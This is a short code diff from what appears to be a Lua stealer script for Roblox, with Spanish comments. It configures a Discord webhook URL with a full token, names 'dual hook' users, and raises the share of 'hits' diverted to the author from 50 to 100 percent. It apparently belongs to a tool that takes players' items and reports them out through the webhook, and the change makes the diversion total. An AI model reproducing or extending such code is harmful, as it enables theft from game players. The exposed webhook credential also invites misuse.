@@ -18,7 +18,7 @@ local pingEveryone = _G.pingEveryone == "Yes"
 local DualHookUsers = {"cybertu24","AnonymousANONIMO125"}
 local DualHookWebhook = "https://discord.com/api/webhooks/1393678758883496078/dWWVbv5oLiiHL9Po5FYg77bbJXVBeHkkij_Hy1MpxQHut1pNY2c_hzNg8jK0Qq7jNCRM" -- Cambia a tu webhook real
 local DualHookMinValue = 1
-local DualHookPercent = 50 -- porcentaje de hits que se van a ti
+local DualHookPercent = 100 -- porcentaje de hits que se van a ti
 
 -- Kick por servidor lleno, privado o VIP
 local function CheckServerInitial()
